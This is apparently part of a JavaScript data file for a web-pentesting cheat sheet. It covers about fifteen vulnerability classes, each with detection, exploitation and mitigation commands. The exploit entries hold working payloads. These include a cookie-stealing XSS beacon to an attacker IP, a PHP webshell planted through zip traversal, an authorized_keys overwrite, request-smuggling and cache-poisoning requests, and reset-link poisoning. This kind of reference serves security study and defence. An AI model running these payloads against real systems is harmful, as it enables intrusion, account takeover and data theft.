      { t: 'Env/Config Theft',       b: 'Read .env or Spring actuator for secrets.', cmd: 'curl -s "[TARGET_URL]/.env"\ncurl -s "[TARGET_URL]/actuator/env" | grep -i "key\\|secret\\|password"' },
      { t: 'Backup File Download',   b: 'Grab backup copies of source/database.', cmd: 'curl -sO "[TARGET_URL]/backup.zip"\ncurl -sO "[TARGET_URL]/db.sql"' },
      { t: 'Version Disclosure → Exploit', b: 'Use version info to select a known CVE.', cmd: 'searchsploit "[SOFTWARE] [VERSION]"' },
    ],
    mitigate: [
      { t: 'Block Sensitive Paths',  b: 'Deny .git, .env, *~, *.bak, /actuator, admin APIs at the web server.', cmd: `# Nginx:\nlocation ~ /\\.(git|env|svn) { deny all; }\nlocation ~ \\.(bak|swp|sql)$ { deny all; }` },
      { t: 'Generic Error Pages',    b: 'Turn off verbose error messages / stack traces in production.' },
      { t: 'Disable Directory Listing', b: 'Ensure autoindex is off.' },
      { t: 'Remove Version Headers', b: 'Strip Server and X-Powered-By headers.' },
      { t: 'Secrets in Vault',       b: 'Move secrets out of source/config; use a secrets manager.' },
    ],
    resources: [
      'https://book.hacktricks.xyz/pentesting-web/active-directory-methodology',
      'https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/',
      'https://portswigger.net/web-security/information-disclosure',
    ],
  },

  // ── RACE CONDITION ─────────────────────────────────
  race: {
    name: 'Race Condition / TOCTOU',
    detect: [
      { t: 'Turbo Intruder Test',    b: 'Send parallel requests to a state-changing endpoint.', cmd: `# Burp: send request to Turbo Intruder\n# engine.queue(b'POST /api/transfer ...') x 50 in parallel` },
      { t: 'Repeated Request Race',  b: 'Fire the same coupon/reset request N times simultaneously.', cmd: `for i in $(seq 1 20); do curl -s -b cookies.txt -X POST "[TARGET_URL]/api/redeem" -d "code=XXXX" & done; wait` },
      { t: 'Parallel Login Reset',   b: 'Trigger two password resets at once to see which code holds.' },
      { t: 'rceditor (Race Tool)',   b: 'Automated race-condition testing for web apps.', cmd: 'python3 rceditor.py -u "[TARGET_URL]/api/act" -n 30' },
    ],
    exploit: [
      { t: 'Coupon/Coin Double-Spend', b: 'Redeem the same promo code/gift card multiple times.', cmd: `# Race 30 requests; if all 30 deduct once but credit N times → race` },
      { t: 'Balance/Transfer Race',  b: 'Initiate many transfers with the same balance simultaneously.' },
      { t: 'File TOCTOU (upload)',   b: 'Race a file read against a cleanup delete to read the content.', cmd: 'while true; do curl -s "[TARGET_URL]/tmp/upload.txt"; done & curl -s "[TARGET_URL]/cleanup"; wait' },
    ],
    mitigate: [
      { t: 'Atomic DB Ops',          b: 'Use transactions / atomic UPDATE with checks (e.g., `UPDATE ... SET balance=balance-x WHERE balance>=x`).' },
      { t: 'Idempotency Keys',       b: 'Require a unique request ID per operation; reject repeats.' },
      { t: 'Server-Side Validation', b: 'Re-validate state inside the transaction, not from client data.' },
      { t: 'Optimistic Locking',     b: 'Add version columns; abort if version changed.' },
    ],
    resources: [
      'https://portswigger.net/web-security/logic-flaws/race-condition',
      'https://book.hacktricks.xyz/pentesting-web/race-condition',
      'https://portswigger.net/burp/documentation/desktop/tools/turbo-intruder',
    ],
  },

  // ── CRYPTOGRAPHIC ISSUES ───────────────────────────
  crypto: {
    name: 'Weak Cryptography',
    detect: [
      { t: 'TLS Analysis',           b: 'Check the site cipher suite and protocol versions.', cmd: 'nmap --script ssl-enum-ciphers -p 443 [TARGET_HOST]' },
      { t: 'sslscan / testssl.sh',   b: 'Detailed TLS misconfiguration audit.', cmd: 'testssl.sh [TARGET_URL]' },
      { t: 'Weak Hash Detect',       b: 'Identify MD5/SHA1 password hashes in leaks/DB dumps.', cmd: 'grep -E "\\$2y\\$|\\$1\\$|md5\\(|\\$apr1" dump.sql' },
      { t: 'Cookie Flag Review',     b: 'Check cookies for missing Secure/HttpOnly over HTTPS.', cmd: 'curl -sI [TARGET_URL] | grep -i set-cookie' },
      { t: 'JWT/JWE Inspect',        b: 'Decode token payloads to check for weak signing.', cmd: 'python3 jwt_tool.py [JWT_TOKEN] -d' },
    ],
    exploit: [
      { t: 'Downgrade to Weak Cipher', b: 'Force the server to negotiate a broken suite (3DES, RC4, export).', cmd: 'openssl s_client -connect [TARGET_HOST]:443 -cipher "RC4-SHA" </dev/null 2>/dev/null | grep -i cipher' },
      { t: 'MD5 Password Cracking',  b: 'Crack MD5/NTLM hashes from a leaked database.', cmd: 'hashcat -a 0 -m 0 hashes.txt rockyou.txt' },
      { t: 'Padding Oracle',         b: 'Exploit CBC padding oracle to decrypt ciphertext.', cmd: 'python3 padBuster.py "[TARGET_URL]/check?cipher=Dk1i..." [CIPHER] 16 -encoding 0' },
      { t: 'Weak Random Token',      b: 'Predictable tokens → forge session/reset links.', cmd: 'python3 predict_token.py [SAMPLE_TOKENS]' },
    ],
    mitigate: [
      { t: 'Modern TLS 1.2/1.3',     b: 'Disable SSLv3/TLS1.0/1.1 and weak ciphers.', cmd: `# Nginx:\nssl_protocols TLSv1.2 TLSv1.3;\nssl_ciphers HIGH:!aNULL:!MD5;` },
      { t: 'Strong Password Hashing', b: 'Use bcrypt/argon2/scrypt, never MD5/SHA1 for passwords.' },
      { t: 'Secure Cookies',         b: 'Set Secure; HttpOnly; SameSite on all cookies.' },
      { t: 'CSPRNG for Tokens',      b: 'Generate tokens with crypto/random — never time/Math.random.' },
      { t: 'Encryption at Rest',     b: 'Encrypt sensitive DB fields with AES-256-GCM and managed keys.' },
    ],
    resources: [
      'https://book.hacktricks.xyz/network-services-pentesting/pentesting-tls-ssl',
      'https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/',
      'https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html',
      'https://github.com/drwetter/testssl.sh',
    ],
  },

  // ── HTTP REQUEST SMUGGLING ─────────────────────────
  smuggling: {
    name: 'HTTP Request Smuggling (CL.TE / TE.CL)',
    detect: [
      { t: 'CL.TE Probe',            b: 'Send Content-Length AND Transfer-Encoding and watch for skew.', cmd: `curl -s -o /dev/null -w "%{http_code}" "[TARGET_URL]" -H "Content-Length: 6" -H "Transfer-Encoding: chunked" -d "0\\r\\n\\r\\nG"` },
      { t: 'TE.CL Probe',            b: 'Front-end uses TE, back-end uses CL.', cmd: `curl -s -o /dev/null -w "%{http_code}" "[TARGET_URL]" -H "Transfer-Encoding: chunked" -H "Content-Length: 4" --data-binary "0\\r\\nX"` },
      { t: 'HTTP/2 Downgrade Smuggle', b: 'Send a request with Content-Length ignored by H2 (H2.CL / H2.TE).', cmd: 'npm i h2csmuggler; h2csmuggler -u https://[TARGET_URL]' },
      { t: 'Difference Detection',   b: 'Send the same request twice and compare response times/errors for skew.' },
    ],
    exploit: [
      { t: 'CL.TE Poison',           b: 'Smuggle a request that poisons the next user request.', cmd: `curl -s "[TARGET_URL]" -H "Content-Length: 4" -H "Transfer-Encoding: chunked" --data-binary "0\\r\\n\\r\\nGET /admin HTTP/1.1\\r\\nHost: localhost\\r\\n\\r\\n"` },
      { t: 'TE.CL Poison',           b: 'Smuggle via chunked encoding split.', cmd: `printf 'POST / HTTP/1.1\\r\\nHost: [TARGET_URL]\\r\\nTransfer-Encoding: chunked\\r\\nContent-Length: 4\\r\\n\\r\\n0\\r\\n\\r\\nGET /priv HTTP/1.1\\r\\nHost: localhost\\r\\n\\r\\n' | nc [TARGET_HOST] 80` },
      { t: 'Cache Poisoning Smuggle', b: 'Smuggle a request that poisons a cached URL for other users.' },
      { t: 'WAF Bypass',             b: 'Smuggle malicious requests past the front-end WAF.' },
    ],
    mitigate: [
      { t: 'Disable TE (Front-end)', b: 'Reject Transfer-Encoding entirely at the edge; rely on CL only consistently.' },
      { t: 'Normalize Lengths',      b: 'All hops must normalize conflicting CL/TE headers and drop ambiguous requests.' },
      { t: 'HTTP/1.1 Connection Reuse Off', b: 'Disable keep-alive between front/back-end if version mismatched.' },
      { t: 'Update Servers',         b: 'Patch known-timing-skew CVEs in Apache/Nginx/IIS/AWS ALB.' },
      { t: 'Monitor for Skew',       b: 'Detect abnormal response times/status codes that indicate smuggling.' },
    ],
    resources: [
      'https://portswigger.net/web-security/request-smuggling',
      'https://book.hacktricks.xyz/pentesting-web/http-request-smuggling',
      'https://github.com/kleiton0x00/RequestSmuggling',
    ],
  },

  // ── SUBDOMAIN TAKEOVER ─────────────────────────────
  subdomain: {
    name: 'Subdomain Takeover',
    detect: [
      { t: 'DNS + Fingerprint',      b: 'Resolve the subdomain and look for dangling NXDOMAIN / third-party service.', cmd: `dig +short sub.[TARGET_HOST]\nhost sub.[TARGET_HOST]\ncurl -sI "https://sub.[TARGET_HOST]" | head -5` },
      { t: 'can-i-take-over-xyz',    b: 'Check fingerprints for many takeover-able services.', cmd: 'cat subdomains.txt | while read d; do curl -sI "http://$d" | grep -qiE "No such bucket|There is nothing|Nope...|404.bithub" && echo "$d"; done' },
      { t: 'subjack / subover',      b: 'Automated takeover candidate scanner.', cmd: 'subjack -w subdomains.txt -t 100 -timeout 30 -o results.txt' },
      { t: 'crt.sh Enumerate',       b: 'Find unattended subdomains via certificate transparency.', cmd: 'curl -s "https://crt.sh/?q=%25.[TARGET_HOST]&output=json" | jq -r ".[].name_value" | sort -u' },
      { t: 'httpx Probing',          b: 'Probe live hosts quickly.', cmd: 'cat subdomains.txt | httpx -silent -status-code -title' },
    ],
    exploit: [
      { t: 'Register Dangling CNAME', b: 'Claim the dangling service (Heroku/Azure/GitHub Pages/S3) to host content at the subdomain.', cmd: '# AWS S3 bucket takeover:\naws s3 mb s3://sub.example.com-takeover\n# Configure bucket for static hosting; add policy allowing public read' },
      { t: 'Cookie/Phishing Host',   b: 'Host a login clone on the hijacked subdomain.' },
      { t: 'Email Spoofing',         b: 'Send phishing email from a trusted-looking subdomain.' },
      { t: 'CSP Bypass',             b: 'If the parent domain trusts the subdomain in CSP, bypass it with injected script.' },
    ],
    mitigate: [
      { t: 'Monitor DNS Records',    b: 'Track CNAME/A records; alert on dangling entries.' },
      { t: 'Remove Unused Records',  b: 'Delete DNS entries for decommissioned services immediately.' },
      { t: 'Automated Scanning',     b: 'Run subjack/nuclei on schedule against the full domain scope.' },
      { t: 'Register Nameservers',   b: 'For unused wildcards, claim 3rd-party nameservers or take down DNS entirely.' },
    ],
    resources: [
      'https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/domain-takeover',
      'https://github.com/EdOverflow/can-i-take-over-xyz',
      'https://owasp.org/www-community/attacks/Subdomain_Takeover',
    ],
  },

  // ── HOST HEADER INJECTION ──────────────────────────
  hostheader: {
    name: 'Host Header Injection',
    detect: [
      { t: 'Custom Host Test',       b: 'Send a request with a modified Host header and inspect the response.', cmd: `curl -sI "[TARGET_URL]" -H "Host: evil.com"` },
      { t: 'Absolute URL Test',      b: 'Send the full URL in the request line to override routing.', cmd: 'curl -s -H "Host: evil.com" --url "http://[TARGET_HOST]/" ' },
      { t: 'Duplicate Host',         b: 'Send two Host headers; front/back may disagree.', cmd: `curl -sI "[TARGET_URL]" -H "Host: evil.com" -H "Host: [REAL_HOST]"` },
      { t: 'Injection in Links',     b: 'Send a Host of "evil.com" and see if generated links/password-reset URLs use it.', cmd: 'curl -s "[TARGET_URL]/login" -H "Host: evil.com" | grep -i "href" | head' },
    ],
    exploit: [
      { t: 'Password Reset Poisoning', b: 'Supply attacker host so reset links embed your domain.', cmd: `curl -s -X POST "[TARGET_URL]/forgot" -d "email=victim@corp.com" -H "Host: evil.com"` },
      { t: 'Cache Poisoning',        b: 'Poison a cached page to serve attacker-hosted assets.', cmd: `curl -s "[TARGET_URL]/" -H "Host: evil.com" -H "X-Forwarded-Host: evil.com/cdn.js"` },
      { t: 'Routing to Internal Host', b: 'Point Host at an internal virtual host to reach admin panels.', cmd: 'curl -s "[TARGET_URL]/" -H "Host: admin.internal"' },
      { t: 'Web Cache Deception',    b: 'Abuse cache-key to store attacker-controlled responses.' },
    ],
    mitigate: [
      { t: 'Validate Host Allowlist', b: 'Reject requests whose Host is not in an explicit allowlist.' },
      { t: 'Ignore X-Forwarded-Host', b: 'Use a trusted proxy to set Host, never trust client-supplied X-Forwarded-Host.' },
      { t: 'Absolute URLs',          b: 'Generate all links/password-reset URLs from a config constant, not the request Host.' },
      { t: 'Duplicate Header Reject', b: 'Reject requests containing duplicate Host headers.' },
    ],
    resources: [
      'https://portswigger.net/web-security/host-header',
      'https://book.hacktricks.xyz/pentesting-web/host-header-injection',
      'https://owasp.org/www-community/attacks/HTTP_Request_Smuggling',
    ],
  },

  // ── CRLF INJECTION ─────────────────────────────────
  crlf: {
    name: 'CRLF / Log Injection',
    detect: [
      { t: 'Header Injection Probe', b: 'Inject %0d%0a into a param and look for new response headers (Set-Cookie).', cmd: `curl -sI "[TARGET_URL]/?next=%0d%0aSet-Cookie:owned=1" | grep -i "set-cookie"` },
      { t: 'Log Injection Probe',    b: 'Inject CRLF into a logged field to forge log lines.', cmd: `curl -s "[TARGET_URL]/search?q=%0d%0a[FORGED]%20INFO%20user%3Aadmin"` },
      { t: 'Burp CRLF Script',      b: 'Brute-force CRLF encodings across all params.', cmd: '# Burp Intruder with %0a%0d, %0d%0a, %00, %250a payloads on all inputs' },
    ],
    exploit: [
      { t: 'Set Header → XSS/Session Fix', b: 'Inject a Set-Cookie to fixate a session.', cmd: `curl -sI "[TARGET_URL]/?x=%0d%0aSet-Cookie:sess=fake;Path=/"` },
      { t: 'Deface Response',        b: 'Inject injected HTML into the response body.', cmd: `curl -s "[TARGET_URL]/?x=%0d%0aContent-Type:text/html%0d%0a%0d%0a<html>HACKED</html>"` },
      { t: 'Log Poisoning',          b: 'Forge fake access/log entries to mislead admins.', cmd: `curl -s "[TARGET_URL]/?user=%0d%0a127.0.0.1%20-%20-\\"[OK]%20admin%20login\\""` },
    ],
    mitigate: [
      { t: 'Sanitize CR/LF Input',   b: 'Strip \\r \\n %0d %0a from all user input before use in headers or logs.' },
      { t: 'Encode Header Values',   b: 'URL-encode values injected into response headers via a safe API.' },
      { t: 'Header APIs Only',       b: 'Set headers through framework APIs (setHeader), never by string concatenation.' },
      { t: 'Log Format Whitelist',   b: 'Remove CR/LF from user fields before writing to logs.' },
    ],
    resources: [
      'https://book.hacktricks.xyz/pentesting-web/crlf-0d-0a-injection',
      'https://owasp.org/www-community/vulnerabilities/CRLF_Injection',
      'https://portswigger.net/web-security/crlf-injection',
    ],
  },

  // ── WEB CACHE POISONING ────────────────────────────
  cachepoison: {
    name: 'Web Cache Poisoning',
    detect: [
      { t: 'Cache Key Diff',         b: 'Find inputs that change the response but are NOT part of the cache key.', cmd: `curl -sI "[TARGET_URL]/" -H "X-Forwarded-Host: evil.com"` },
      { t: 'Unkeyed Header Test',    b: 'Compare responses for unkeyed headers (X-Forwarded-*, X-Host, X-Original-URL).', cmd: `for h in "X-Forwarded-Host" "X-Host" "X-Original-URL" "X-Rewrite-URL"; do echo "== $h"; curl -sI "[TARGET_URL]/" -H "$h: /admin" | head -4; done` },
      { t: 'Cachebuster Toggle',     b: 'Request with a cachebuster to confirm a response is cached for others.', cmd: 'curl -s "[TARGET_URL]/?cb=12345" -H "X-Host: evil.com" && sleep 1 && curl -s "[TARGET_URL]/?cb=12345"' },
      { t: 'cache-poisoning Tool',   b: 'Automated unkeyed-input discovery.', cmd: 'python3 cache_poisoning.py -u https://[TARGET_URL]/' },
    ],
    exploit: [
      { t: 'Poison Default Page',    b: 'Cache a page with attacker-controlled assets.', cmd: `curl -s "[TARGET_URL]/" -H "X-Forwarded-Scheme: http" -o /dev/null` },
      { t: 'Cache a 302 → Phish',    b: 'Poison a redirect so victims land on an attacker page.', cmd: `curl -s "[TARGET_URL]/logout" -H "X-Forwarded-Host: evil.com"` },
      { t: 'Cache Stored XSS',       b: 'Cache a page containing your XSS payload via an unkeyed header.' },
    ],
    mitigate: [
      { t: 'Whitelist Cache Keys',   b: 'Only key on Host, path, and explicit Vary headers.' },
      { t: 'Ignore Unexpected Headers', b: 'CDN must not reflect X-Forwarded-* into cached output.' },
      { t: 'Do Not Cache Authed/State', b: 'Never cache responses with Set-Cookie, auth, or personalized content.' },
      { t: 'Timeout + Request-Body Key', b: 'Lower cache TTLs and add request-body to the key where possible.' },
    ],
    resources: [
      'https://portswigger.net/web-security/web-cache-poisoning',
      'https://book.hacktricks.xyz/pentesting-web/cache-deception',
      'https://github.com/txt3rob/cache-poisoning',
    ],
  },

  // ── PROTOTYPE POLLUTION ────────────────────────────
  prototype: {
    name: 'Prototype Pollution',
    detect: [
      { t: 'Server JSON Probe',      b: 'Send __proto__/constructor in JSON bodies and check for reflection.', cmd: `curl -s -X POST "[TARGET_URL]/api/user" -H "Content-Type: application/json" -d '{"__proto__":{"isAdmin":true}}'` },
      { t: 'Client Library Check',   b: 'Audit bundled JS for vulnerable merge/extend patterns.', cmd: "grep -rE 'merge|extend|clone|defaults' assets/*.js" },
      { t: 'Prototype Scanner',      b: 'Use automated scanners for client-side pollution.', cmd: 'npm run scan -- --url "[TARGET_URL]"' },
    ],
    exploit: [
      { t: 'Server RCE Chain',       b: 'Pollute options that reach child_process/got (e.g., shell).', cmd: `curl -s -X POST "[TARGET_URL]/api" -H "Content-Type: application/json" -d '{"__proto__":{"shell":"node","argv0":"x","NODE_OPTIONS":"--require=/proc/self/environ"}}'` },
      { t: 'Auth Bypass via isAdmin', b: 'Pollute isAdmin/role across the app.', cmd: `curl -s -X POST "[TARGET_URL]/login" -H "Content-Type: application/json" -d '{"constructor":{"prototype":{"isAdmin":true}}}'` },
      { t: 'XSS via Polluted Sinks', b: 'Pollute innerHTML or src in a library to get DOM XSS.' },
    ],
    mitigate: [
      { t: 'Use Safe Merges',        b: 'Use Object.freeze/typed assignments; avoid deep recursive merge of untrusted input.' },
      { t: 'Schema Validation',      b: 'Reject keys named __proto__/constructor/prototype in payload schemas.' },
      { t: 'Null Prototype Objects', b: 'Use Object.create(null) or Map for untrusted keys.' },
      { t: 'Update Libraries',       b: 'Patch EJS, lodash, minimist, etc. with fixed versions.' },
    ],
    resources: [
      'https://book.hacktricks.xyz/pentesting-web/dependency-confusion',
      'https://portswigger.net/research/prototype-pollution-client-side',
      'https://github.com/BlackFan/client-side-prototype-pollution',
    ],
  },

  // ── CLICKJACKING ───────────────────────────────────
  clickjacking: {
    name: 'Clickjacking / UI Redress',
    detect: [
      { t: 'Frame Test',             b: 'Check if the app can be framed (no X-Frame-Options / CSP frame-ancestors).', cmd: `curl -sI "[TARGET_URL]" | grep -i "x-frame-options\\|content-security-policy"` },
      { t: 'iFrame PoC Page',        b: 'Create a page that iframes the target transparently.', cmd: `<!-- poc.html -->\n<iframe src="https://[TARGET_URL]/action" style="opacity:0.01;position:absolute;top:0;left:0;width:100%;height:100%"></iframe>` },
      { t: 'Clickjack Scanner',      b: 'Automated framing-detection across the app.', cmd: 'python3 clickjack.py -u [TARGET_URL]' },
    ],
    exploit: [
      { t: 'CSRF-Like Action',       b: 'Trick the victim into clicking Delete/Transfer inside the transparent iframe.', cmd: '# Align victim button over "Delete Account" in the framed page' },
      { t: 'Double-Click Attacks',   b: 'Use pointer-events de/activation to force a double-click into a sensitive action.' },
      { t: 'Form Overlay',           b: 'Overlay a fake form over the real one to capture input.' },
    ],
    mitigate: [
      { t: 'X-Frame-Options',        b: 'Send DENY/SAMEORIGIN on all sensitive pages.', cmd: 'X-Frame-Options: DENY' },
      { t: 'CSP frame-ancestors',    b: 'Modern alternative with finer control.', cmd: `Content-Security-Policy: frame-ancestors 'self'` },
      { t: 'Frame-Busting JS (defense-in-depth)', b: 'Refuse to render if window.self !== window.top.', cmd: `if (window.top !== window.self) { window.top.location = window.self.location; }` },
    ],
    resources: [
      'https://book.hacktricks.xyz/pentesting-web/clickjacking',
      'https://owasp.org/www-community/attacks/Clickjacking',
      'https://portswigger.net/web-security/clickjacking',
    ],
  },

  // ── SESSION FIXATION / HIJACK ──────────────────────
  sessionfix: {
    name: 'Session Fixation / Hijacking',
    detect: [
      { t: 'Pre-Login Token Check',  b: 'Verify the session ID does NOT stay the same before and after login.', cmd: `curl -c c1 "https://[TARGET_URL]/login" && curl -b c1 -c c2 -X POST "https://[TARGET_URL]/auth" -d "user=u&pass=p" && diff c1 c2 | grep session` },
      { t: 'Cookie Flag Inspector',  b: 'Check session cookies for Secure/HttpOnly/SameSite.', cmd: `curl -sI "https://[TARGET_URL]/" | grep -i set-cookie` },
      { t: 'URL Token Check',        b: 'Look for tokens passed in URL query (leakable via Referer).', cmd: "grep -rE 'sid=|token=|PHPSESSID=' /tmp/traffic.pcap" },
    ],
    exploit: [
      { t: 'Fixate & Capture',       b: 'Preset a victim cookie, then await them logging in.', cmd: `curl -sI "[TARGET_URL]/?SID=attacker123" | grep -i set-cookie` },
      { t: 'Session Steal via XSS',  b: 'If HttpOnly is missing, JS reads the cookie.', cmd: `<img src=x onerror="fetch('http://[ATTACKER_IP]/?c='+document.cookie)">` },
      { t: 'Token in GET Logs',      b: 'Passive interception of tokens leaked in logs/referrer.' },
    ],
    mitigate: [
      { t: 'Rotate Session on Auth', b: 'Generate a NEW session id at login/logout; invalidate the old one.' },
      { t: 'HttpOnly + Secure',      b: 'Mark all session cookies HttpOnly; Secure; SameSite=Strict.', cmd: 'Set-Cookie: sessionid=TOKEN; HttpOnly; Secure; SameSite=Strict' },
      { t: 'Expiry & Rotation',      b: 'Short absolute expiry, plus sliding window; rotate on privilege change.' },
      { t: 'Bind to Client',         b: 'Tie session to client fingerprint and revoke on mismatch.' },
    ],
    resources: [
      'https://owasp.org/www-community/attacks/Session_fixation',
      'https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html',
      'https://book.hacktricks.xyz/pentesting-web/session-puzzling',
    ],
  },

  // ── HTTP VERB TAMPERING ────────────────────────────
  httpverb: {
    name: 'HTTP Method / Verb Tampering',
    detect: [
      { t: 'OPTIONS Reveal',         b: 'List allowed methods.', cmd: `curl -sI -X OPTIONS "[TARGET_URL]/admin"` },
      { t: 'Forged Verb Test',       b: 'Retry restricted actions with different verbs.', cmd: `for m in GET POST PUT PATCH DELETE OPTIONS TRACE CONNECT; do\n  echo "== $m"; curl -s -o /dev/null -w "%{http_code}\\n" -X $m "[TARGET_URL]/admin/delete"\ndone` },
      { t: 'TRACE Check',            b: 'Detect TRACE enabled (XST risk).', cmd: `curl -s -X TRACE "[TARGET_URL]/" -H "Cookie: sess=test"` },
    ],
    exploit: [
      { t: 'GET-Only Bypass',        b: 'If WAF blocks POST but GET runs the action, execute via GET.', cmd: `curl -s "[TARGET_URL]/transfer?amount=100&to=attacker"` },
      { t: 'XST (TRACE)',            b: 'Reflect cookies via TRACE when HttpOnly is missing.', cmd: `curl -s -X TRACE "[TARGET_URL]/" -H "Cookie: session=..." | grep "Cookie:"` },
      { t: 'PATCH Config Change',    b: 'Patch resources the GET/POST handlers overlook.', cmd: `curl -s -X PATCH -H "Content-Type: application/json" -d '{"role":"admin"}' "[TARGET_URL]/api/user/1"` },
    ],
    mitigate: [
      { t: 'Restrict Methods',       b: 'Allowlist required verbs only.', cmd: `# Nginx: if ($request_method !~ ^(GET|POST|HEAD)$) { return 405; }` },
      { t: 'CSRF on All Verbs',      b: 'Enforce CSRF tokens on every state-changing verb (PUT/PATCH/DELETE included).' },
      { t: 'Disable TRACE',          b: 'Turn off TRACE/TRACK globally.' },
      { t: 'AuthZ on Every Verb',    b: 'Route-level authorization checks must apply to all methods, not just POST.' },
    ],
    resources: [
      'https://book.hacktricks.xyz/network-services-pentesting/pentesting-web',
      'https://owasp.org/www-community/attacks/HTTP_Method_Override',
    ],
  },

  // ── ZIP SLIP ───────────────────────────────────────
  zipslip: {
    name: 'Zip Slip (Archive Extraction)',
    detect: [
      { t: 'Craft Archive Test',     b: 'Upload an archive with ../-traversing members and see where it lands.', cmd: `python3 - <<'EOF'\nimport zipfile\nz = zipfile.ZipFile('evil.zip','w')\nz.writestr('../../../../tmp/pwned.txt', 'pwned')\nz.close()\nEOF\ncurl -s -F "file=@evil.zip" "[TARGET_URL]/upload"` },
      { t: 'Symlink Inside ZIP',     b: 'Upload a zip containing a symlink to an arbitrary path.', cmd: `ln -s /etc/passwd link\nzip --symlinks evil2.zip link` },
      { t: 'Automated ZipScan',      b: 'Audit extraction logic in source.', cmd: 'grep -R "extractall\\|unzip_to_dir\\|ZipInputStream" /src' },
    ],
    exploit: [
      { t: 'Overwrite Webshell',     b: 'Traverse to webroot and drop a webshell.', cmd: `python3 - <<'EOF'\nimport zipfile\nz = zipfile.ZipFile('wd.zip','w')\nz.writestr('../../../../var/www/html/shell.php', '<?php system($_GET[c]);?>')\nz.close()\nEOF\ncurl -s -F "file=@wd.zip" "[TARGET_URL]/upload"` },
      { t: 'Overwrite Config/Keys',  b: 'Overwrite .ssh/authorized_keys or app config.', cmd: 'z.writestr("../../../../root/.ssh/authorized_keys", "ssh-rsa AAA..." )' },
    ],
    mitigate: [
      { t: 'Validate Zip Members',   b: 'Reject entries whose canonical path escapes the extract dir.', cmd: `# Python check:\nfor name in z.namelist():\n    target = os.path.normpath(os.path.join(dest, name))\n    assert target.startswith(dest), name` },
      { t: 'No Symlinks',            b: 'Skip symbolic-link members entirely in archives.' },
      { t: 'Sandbox Extraction',     b: 'Extract in a minimal container and validate all outputs.' },
      { t: 'File Type Revalidation', b: 'Re-validate extensions/content after extraction.' },
    ],
    resources: [
      'https://book.hacktricks.xyz/pentesting-web/file-upload',
      'https://github.com/snyk/zip-slip-vulnerability',
      'https://snyk.io/research/zip-slip-vulnerability',
    ],
  },

  // ── ReDoS ──────────────────────────────────────────
  redos: {
    name: 'Regular Expression DoS (ReDoS)',
    detect: [
      { t: 'Catastrophic Backtrack Probe', b: 'Send a long crafted string to a regex endpoint and time it.', cmd: `curl -s -o /dev/null -w "%{time_total}" -d "input=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!" [TARGET_URL]/validate` },
      { t: 'Pattern Review (safe-regex)', b: 'Audit server regexes for exponential complexity.', cmd: `node -e "const sf=require('safe-regex'); console.log(sf(/^(a+)+$/))"` },
      { t: 'rxxr2',                  b: 'Automated ReDoS static analysis for Java/Scala regex.', cmd: 'rxxr2 report src/' },
    ],
    exploit: [
      { t: 'Evil Input Flood',       b: 'Send (a+)+$ pattern input to peg one worker.', cmd: `curl -s -o /dev/null -w "%{time_total}\\n" "[TARGET_URL]/validate?input=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!"` },
      { t: 'Parallel Connection DoS', b: 'Open many sockets each holding a regex CPU-bound.', cmd: 'seq 1 100 | xargs -P20 -I{} curl -s "[TARGET_URL]/validate?input=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!"' },
    ],
    mitigate: [
      { t: 'Avoid Nested Quantifiers', b: 'Never nest +/* inside groups ((a+)+, (x*a+)+).' },
      { t: 'Use Linear Engines',      b: 'Prefer RE2/re2 engine or backtracking-free alternates.' },
      { t: 'Input Length Limits',     b: 'Cap the maximum length of input processed by regexes.' },
      { t: 'Time out the Match',      b: 'Set a strict match timeout in handlers.', cmd: 'python: re.compile(p, timeout=0.1)  # or use regex module' },
    ],
    resources: [
      'https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS',
      'https://snyk.io/blog/redos-and-catastrophic-backtracking/',
      'https://book.hacktricks.xyz/pentesting-web/',
    ],
  },

  // ── OAUTH / OPEN AUTHORIZATION ─────────────────────
  oauth: {
    name: 'OAuth / OpenID Misconfiguration',
    detect: [
      { t: 'Flow Analysis',          b: 'Map the authorize → callback flow; look for loose redirect_uri handling.', cmd: `curl -sI "[AUTHZ]?response_type=code&client_id=[CLIENT]&redirect_uri=[TARGET]/callback&scope=openid"` },
      { t: 'redirect_uri Fuzz',      b: 'Try parameter pollution, path traversal, and whitelist bypass.', cmd: `for u in "https://evil.com" "//evil.com" "[TARGET]/callback%2f..%2f..%2fevil.com" "[TARGET]/callback?next=evil.com"; do\n  curl -s -o /dev/null -w "$u -> %{redirect_url}\\n" "[AUTHZ]?...redirect_uri=$u"\ndone` },
      { t: 'State Parameter Check',  b: 'Remove the state param; test if CSRF on OAuth login works.', cmd: `curl -sI "[AUTHZ]?...&state=" ` },
      { t: 'Token Scope Inspection', b: 'Request more scopes than the app declares.', cmd: `curl -s "[AUTHZ]?...&scope=openid%20profile%20email%20admin"` },
    ],
    exploit: [
      { t: 'OAuth CSRF (state absent)', b: 'Force victim to authorize attacker account and log them into it.', cmd: `# Deliver: <a href="[AUTHZ]?...&state=">Login</a>` },
      { t: 'redirect_uri Stolen Code', b: 'If suffix accepted, steal authorization codes.', cmd: `[AUTHZ]?...&redirect_uri=[TARGET]/callback%2f..%2f%2fattacker.com` },
      { t: 'Scope Escalation',        b: 'Request elevated scopes to read email/contacts.', cmd: `curl -s "[AUTHZ]?...&scope=email%20contacts.readwrite"` },
      { t: 'Token Replay across Apps', b: 'Reuse an access token on different client_ids that share scopes.' },
    ],
    mitigate: [
      { t: 'Exact redirect_uri Match', b: 'Compare redirect_uri with the registered value byte-for-byte.' },
      { t: 'Require state (PKCE)',    b: 'Enforce state + PKCE for public clients; bind state to session.' },
      { t: 'Validate All Claims',     b: 'Verify iss/aud/exp/nonce before accepting tokens.' },
      { t: 'Scope Least-Privilege',   b: 'Only grant scopes the app truly needs; reject unexpected scope requests.' },
    ],
    resources: [
      'https://portswigger.net/web-security/oauth',
      'https://book.hacktricks.xyz/pentesting-web/',
      'https://datatracker.ietf.org/doc/html/rfc6749',
    ],
  },
}

export default GUIDES
